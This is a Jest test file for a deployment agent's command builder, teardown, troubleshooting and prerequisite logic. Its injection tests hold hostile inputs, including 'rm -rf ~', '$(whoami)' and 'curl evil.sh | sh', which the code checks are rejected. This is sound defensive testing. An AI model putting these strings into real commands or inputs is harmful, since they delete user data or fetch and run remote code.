// Copyright 2026 Pipeline Builder Contributors
// SPDX-License-Identifier: Apache-2.0

// child_process is mocked so prereq checks are hermetic + fast (no real docker/aws).
import { describe, it, test, expect, jest, beforeEach, afterAll } from '@jest/globals';

jest.mock('child_process', () => ({
  execSync: jest.fn(() => {
    throw new Error('mocked: command unavailable');
  }),
}));

import { diagnoseFailure, isAiConfigured, parseGoal } from '../src/agent/ai.js';
import { executionBlocked } from '../src/agent/executor.js';
import { deriveHealthUrl } from '../src/agent/health.js';
import { checkPrereqs, prereqsSatisfied } from '../src/agent/prereqs.js';
import { assembleCommand, isTargetId, TARGETS, TARGET_IDS, teardownCommand } from '../src/agent/targets.js';
import { matchIssues, sesPostDeployGuidance } from '../src/agent/troubleshoot.js';

describe('assembleCommand', () => {
  it('assembles a fargate command with the required flags and no missing', () => {
    const { command, missing } = assembleCommand(TARGETS.fargate, { domain: 'p.example.com', hostedZoneId: 'Z1' });
    expect(missing).toHaveLength(0);
    expect(command).toContain('cd deploy/aws/fargate && bash bin/setup.sh');
    expect(command).toContain('--domain p.example.com');
    expect(command).toContain('--hosted-zone-id Z1');
  });

  it('reports missing required inputs (never guesses)', () => {
    const { missing } = assembleCommand(TARGETS.fargate, {});
    expect(missing.map((m) => m.flag).sort()).toEqual(['domain', 'hosted-zone-id']);
  });

  it('flags a missing EC2 key-pair', () => {
    const { missing } = assembleCommand(TARGETS.ec2, { domain: 'd', hostedZoneId: 'z' });
    expect(missing.map((m) => m.flag)).toContain('key-pair');
  });

  it('masks secrets in the assembled command', () => {
    const { command } = assembleCommand(TARGETS.ec2, { keyPair: 'k', domain: 'd', hostedZoneId: 'z', ghcrToken: 'ghp_supersecret' });
    expect(command).toContain('--ghcr-token ***');
    expect(command).not.toContain('ghp_supersecret');
  });

  it('renders boolean flags without a value, and omits them when unset/false', () => {
    const on = assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: 'z', email: true }).command;
    expect(on).toContain('--email');
    expect(on).not.toContain('--email true');

    const off = assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: 'z', email: false }).command;
    expect(off).not.toContain('--email');
  });

  it('SES is on by default: no email flag is emitted unless --no-email is set', () => {
    // Default AWS deploy — neither --email nor --no-email (script defaults SES on).
    const dflt = assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: 'z' }).command;
    expect(dflt).not.toContain('--no-email');
    expect(dflt).not.toMatch(/--email\b/);
    // Opt out — emits --no-email so the deploy script skips SES.
    const off = assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: 'z', noEmail: true }).command;
    expect(off).toContain('--no-email');
  });

  it('local needs no flags and carries a post-deploy init step', () => {
    const { command, missing } = assembleCommand(TARGETS.local, {});
    expect(missing).toHaveLength(0);
    expect(command).toBe('cd deploy/local && bash bin/setup.sh');
    expect(TARGETS.local.postDeploy).toContain('init-platform.sh local');
  });

  it('reveals the real secret only with { mask: false } (for execution)', () => {
    const params = { keyPair: 'k', domain: 'd', hostedZoneId: 'z', ghcrToken: 'ghp_real' };
    expect(assembleCommand(TARGETS.ec2, params).command).toContain('--ghcr-token ***');
    expect(assembleCommand(TARGETS.ec2, params, { mask: false }).command).toContain('--ghcr-token ghp_real');
  });

  it('auto-init is default-on: emits neither flag by default, --no-auto-init only when opted out', () => {
    const reqd = { keyPair: 'k', domain: 'd', hostedZoneId: 'z' };
    // Default: neither flag → setup.sh/template default (true) applies.
    const def = assembleCommand(TARGETS.ec2, reqd).command;
    expect(def).not.toContain('--auto-init');
    expect(def).not.toContain('--no-auto-init');
    // Opt out: the load-bearing --no-auto-init is emitted.
    expect(assembleCommand(TARGETS.ec2, { ...reqd, noAutoInit: true }).command).toContain('--no-auto-init');
    // Explicit reaffirm: --auto-init is emitted.
    expect(assembleCommand(TARGETS.ec2, { ...reqd, autoInit: true }).command).toContain('--auto-init');
  });

  it('rejects a param value carrying shell metacharacters (command injection)', () => {
    // The assembled command is executed via a shell, so an unquoted injection
    // in any value must be refused rather than interpolated.
    expect(() => assembleCommand(TARGETS.fargate, { domain: 'd; rm -rf ~', hostedZoneId: 'z' }))
      .toThrow('unsafe characters');
    expect(() => assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: '$(whoami)' }))
      .toThrow('unsafe characters');
  });

  it('does not echo a secret value when it is rejected for unsafe characters', () => {
    // redactValue: the error must name the flag but never leak the token body.
    try {
      assembleCommand(TARGETS.ec2, { keyPair: 'k', domain: 'd', hostedZoneId: 'z', ghcrToken: 'ghp_evil`id`' }, { mask: false });
      throw new Error('expected assembleCommand to throw');
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      expect(msg).toContain('--ghcr-token');
      expect(msg).toContain('unsafe characters');
      expect(msg).not.toContain('ghp_evil');
    }
  });
});

describe('teardownCommand', () => {
  it('local/minikube stop the stack and are non-destructive', () => {
    const local = teardownCommand('local');
    expect(local.destructive).toBe(false);
    expect(local.command).toBe('cd deploy/local && bash bin/shutdown.sh');
    expect(teardownCommand('minikube').command).toContain('deploy/minikube && bash bin/shutdown.sh');
  });

  it('ec2 deletes the CloudFormation stack (destructive) and waits for completion', () => {
    const r = teardownCommand('ec2', { region: 'us-west-2' });
    expect(r.destructive).toBe(true);
    expect(r.command).toContain('delete-stack --stack-name pipeline-builder --region us-west-2');
    expect(r.command).toContain('wait stack-delete-complete');
  });

  it('ec2 honors an overridden stack name', () => {
    expect(teardownCommand('ec2', { stackName: 'pb-staging' }).command).toContain('--stack-name pb-staging');
  });

  it('fargate runs teardown.sh with the prefix/region and forwards --yes only when asked', () => {
    const plain = teardownCommand('fargate', { region: 'eu-west-1' });
    expect(plain.destructive).toBe(true);
    expect(plain.command).toContain('bin/teardown.sh --stack-prefix pb --region eu-west-1');
    expect(plain.command).not.toContain('--yes');
    expect(teardownCommand('fargate', { assumeYes: true }).command).toContain('--yes');
  });

  it('rejects a stackName or region carrying shell metacharacters (command injection)', () => {
    expect(() => teardownCommand('ec2', { stackName: 'pb; curl evil.sh | sh' })).toThrow('unsafe characters');
    expect(() => teardownCommand('ec2', { region: 'us-east-1 && rm -rf ~' })).toThrow('unsafe characters');
  });
});

describe('deriveHealthUrl', () => {
  it('uses localhost:8443 for local/minikube', () => {
    expect(deriveHealthUrl('local', {})).toBe('https://localhost:8443');
    expect(deriveHealthUrl('minikube', {})).toBe('https://localhost:8443');
  });
  it('uses the domain for ec2/fargate, else null', () => {
    expect(deriveHealthUrl('fargate', { domain: 'p.example.com' })).toBe('https://p.example.com');
    expect(deriveHealthUrl('ec2', {})).toBeNull();
  });
});

describe('matchIssues (deterministic troubleshooting)', () => {
  it('maps a SES "already exists" failure to an auto-fix (--skip-ses-identity), retryable', () => {
    const issues = matchIssues('Resource handler returned message: "Email identity pipeline.example.com already exists" (SesEmailIdentity)');
    const ses = issues.find((i) => i.id === 'ses-identity-exists');
    expect(ses).toBeDefined();
    expect(ses?.retryable).toBe(true);
    expect(ses?.paramFix).toEqual({ key: 'noCreateSesIdentity', value: true });
  });

  it('flags ROLLBACK_COMPLETE as non-retryable with no auto-fix', () => {
    const issues = matchIssues('Stack pb-foundation is in ROLLBACK_COMPLETE state and can not be updated.');
    const rb = issues.find((i) => i.id === 'stack-rollback-complete');
    expect(rb?.retryable).toBe(false);
    expect(rb?.paramFix).toBeUndefined();
  });

  it('recognizes ghcr rate limits and expired creds', () => {
    expect(matchIssues('toomanyrequests: retry later').map((i) => i.id)).toContain('ghcr-rate-limit');
    expect(matchIssues('ExpiredToken: the security token included in the request is expired').map((i) => i.id)).toContain('aws-credentials');
  });

  it('returns nothing for clean output', () => {
    expect(matchIssues('Deployment Complete\nApplication: https://x')).toEqual([]);
  });
});

describe('sesPostDeployGuidance', () => {
  it('covers async DKIM and the sandbox', () => {
    const text = sesPostDeployGuidance().join(' ');
    expect(text).toMatch(/DKIM/);
    expect(text).toMatch(/SANDBOX/i);
  });
});

describe('executionBlocked (the gate)', () => {
  const okPrereq = { name: 'AWS', ok: true, detail: '', required: true };
  it('blocks on a failed required prerequisite', () => {
    expect(executionBlocked([{ ...okPrereq, ok: false }], [])).toMatch(/unmet prerequisites/);
  });
  it('blocks on missing required inputs', () => {
    expect(executionBlocked([okPrereq], [{ flag: 'domain', key: 'domain', description: '' }])).toMatch(/missing required inputs/);
  });
  it('allows when prereqs pass and nothing is missing', () => {
    expect(executionBlocked([okPrereq], [])).toBeNull();
  });
});

describe('isTargetId', () => {
  it('accepts the four targets', () => {
    for (const t of TARGET_IDS) expect(isTargetId(t)).toBe(true);
  });
  it('rejects anything else', () => {
    expect(isTargetId('nope')).toBe(false);
    expect(isTargetId(undefined)).toBe(false);
  });
});

describe('checkPrereqs / prereqsSatisfied', () => {
  it('local checks Docker, Docker Compose, yq, and openssl (all setup.sh hard-requires)', () => {
    const checks = checkPrereqs('local');
    expect(checks.map((c) => c.name)).toEqual(['Docker', 'Docker Compose', 'yq', 'openssl']);
    expect(checks.every((c) => c.required)).toBe(true);
  });
  it('minikube checks Docker/minikube/kubectl/openssl, and yq only with plugins', () => {
    const base = checkPrereqs('minikube').map((c) => c.name);
    expect(base).toEqual(['Docker', 'minikube', 'kubectl', 'openssl']);
    expect(base).not.toContain('yq');
    expect(checkPrereqs('minikube', { withPlugins: true }).map((c) => c.name)).toContain('yq');
  });
  it('ec2 checks only the AWS CLI + credentials (instance self-bootstraps)', () => {
    const names = checkPrereqs('ec2').map((c) => c.name);
    expect(names).toEqual(['AWS CLI', 'AWS credentials']);
  });
  it('fargate additionally requires openssl (init-secrets.sh generates secrets locally)', () => {
    const names = checkPrereqs('fargate').map((c) => c.name);
    expect(names).toContain('AWS CLI');
    expect(names).toContain('AWS credentials');
    expect(names).toContain('openssl');
  });
  it('prereqsSatisfied honors required vs advisory', () => {
    expect(prereqsSatisfied([{ name: 'x', ok: true, detail: '', required: true }])).toBe(true);
    expect(prereqsSatisfied([{ name: 'x', ok: false, detail: '', required: true }])).toBe(false);
    expect(prereqsSatisfied([{ name: 'x', ok: false, detail: '', required: false }])).toBe(true);
  });
});

describe('ai helpers degrade gracefully without a key', () => {
  const saved = { ...process.env };
  beforeEach(() => {
    delete process.env.ANTHROPIC_API_KEY;
    delete process.env.AI_PROVIDER;
    delete process.env.AI_MODEL;
  });
  afterAll(() => {
    process.env = saved;
  });

  it('isAiConfigured is false without a key and true with one', () => {
    expect(isAiConfigured()).toBe(false);
    process.env.ANTHROPIC_API_KEY = 'sk-test';
    expect(isAiConfigured()).toBe(true);
  });
  it('resolves the bedrock alias to the canonical amazon-bedrock id for key detection', () => {
    delete process.env.AWS_ACCESS_KEY_ID;
    expect(isAiConfigured({ provider: 'bedrock' })).toBe(false);
    process.env.AWS_ACCESS_KEY_ID = 'AKIA_test';
    // Both the friendly alias and the canonical id must detect the AWS key.
    expect(isAiConfigured({ provider: 'bedrock' })).toBe(true);
    expect(isAiConfigured({ provider: 'amazon-bedrock' })).toBe(true);
    delete process.env.AWS_ACCESS_KEY_ID;
  });
  it('parseGoal returns null without a key (deterministic fallback)', async () => {
    await expect(parseGoal('deploy to fargate in us-east-1')).resolves.toBeNull();
  });
  it('diagnoseFailure returns null without a key', async () => {
    await expect(diagnoseFailure('CREATE_FAILED ...')).resolves.toBeNull();
  });
});
